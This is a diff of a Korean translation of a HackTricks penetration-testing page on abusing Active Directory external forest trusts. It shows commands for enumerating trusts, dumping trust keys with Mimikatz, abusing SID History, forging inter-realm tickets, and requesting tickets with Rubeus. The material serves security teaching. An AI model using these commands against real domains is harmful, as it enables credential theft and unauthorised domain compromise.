@@ -2,12 +2,12 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-이 시나리오에서 외부 도메인이 당신을 신뢰하고 있거나 (또는 서로 신뢰하고 있는 경우) 당신은 그에 대한 어떤 종류의 접근 권한을 얻을 수 있습니다.
+이 시나리오에서 외부 도메인은 당신을 신뢰하고 있습니다 (또는 두 도메인이 서로를 신뢰하고 있습니다), 따라서 당신은 그에 대한 어떤 형태의 접근 권한을 얻을 수 있습니다.
 
 ## 열거
 
 우선, **신뢰**를 **열거**해야 합니다:
-```powershell
+```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
@@ -56,14 +56,14 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-이전 열거에서 사용자 **`crossuser`**가 **외부 도메인**의 **DC** 내에서 **관리자 액세스**를 가진 **`External Admins`** 그룹에 속해 있는 것으로 확인되었습니다.
+이전 열거에서 **`crossuser`** 사용자가 **외부 도메인**의 **DC** 내에서 **Admin access**를 가진 **`External Admins`** 그룹에 속해 있는 것으로 확인되었습니다.
 
-## 초기 액세스
+## 초기 접근
 
-다른 도메인에서 사용자에 대한 **특별한** 액세스를 **찾지 못한 경우**, AD 방법론으로 돌아가서 **비특권 사용자에서 권한 상승**을 시도할 수 있습니다(예: kerberoasting과 같은):
+다른 도메인에서 사용자의 **특별한** 접근 권한을 **찾지 못한 경우**, AD 방법론으로 돌아가서 **비특권 사용자에서 권한 상승**을 시도할 수 있습니다 (예: kerberoasting과 같은):
 
-`-Domain` 매개변수를 사용하여 **Powerview 함수**를 사용하여 **다른 도메인**을 **열거**할 수 있습니다:
-```powershell
+`-Domain` 매개변수를 사용하여 **Powerview functions**를 사용하여 **다른 도메인**을 **열거**할 수 있습니다:
+```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
 {{#ref}}
@@ -75,23 +75,23 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ### 로그인
 
 외부 도메인에 접근할 수 있는 사용자의 자격 증명을 사용하여 일반적인 방법으로 로그인하면 다음에 접근할 수 있어야 합니다:
-```powershell
+```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### SID History 남용
 
-당신은 또한 숲 신뢰를 통해 [**SID History**](sid-history-injection.md)를 남용할 수 있습니다.
+당신은 또한 숲 신뢰를 가로질러 [**SID History**](sid-history-injection.md)를 남용할 수 있습니다.
 
-사용자가 **한 숲에서 다른 숲으로** 마이그레이션되고 **SID 필터링이 활성화되지 않은 경우**, **다른 숲의 SID를 추가하는 것이 가능**해지며, 이 **SID**는 **신뢰를 통해 인증할 때** **사용자의 토큰에 추가**됩니다.
+사용자가 **한 숲에서 다른 숲으로** 마이그레이션되고 **SID 필터링이 활성화되지 않은 경우**, **다른 숲의 SID를 추가하는** 것이 가능해지며, 이 **SID**는 **신뢰를 가로질러 인증할 때** **사용자의 토큰**에 **추가**됩니다.
 
 > [!WARNING]
-> 상기 사항으로, 서명 키를 얻을 수 있습니다.
+> 참고로, 서명 키를 얻으려면
 >
-> ```powershell
+> ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-당신은 **신뢰된** 키로 현재 도메인의 사용자를 **가장하는** **TGT에 서명할 수 있습니다**.
+당신은 **신뢰된** 키로 현재 도메인의 사용자를 **가장하는** **TGT**에 **서명할 수** 있습니다.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -102,7 +102,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### 사용자 완전 임포스네이팅 방법
+### 사용자 완전 위장 방법
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
